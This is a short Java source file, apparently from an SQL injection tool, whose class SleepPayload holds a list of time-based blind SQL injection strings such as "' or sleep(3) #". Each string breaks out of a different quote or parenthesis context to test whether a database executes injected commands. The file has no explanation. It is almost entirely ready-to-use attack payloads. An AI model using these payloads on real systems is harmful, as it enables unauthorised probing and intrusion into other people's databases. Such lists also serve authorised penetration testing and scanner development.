package com.sql.sqlinjecttool.payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class SleepPayload {
    public static List sleepPayload= Arrays.asList(
            " and sleep(3) and  1=1 ",
            ") and sleep(3) and (1=1  ",
            "' and sleep(3) and '1'='1 ",
            "') and sleep(3) and ('1'='1",
            "\" and sleep(3) and \"A\"=\"A",
            " or sleep(3) # ",
            ") or sleep(3) #",
            "' or sleep(3) #",
            "') or sleep(3) #",
            "\" or sleep(3) #",
            "\") or sleep(3) # "
    );
}
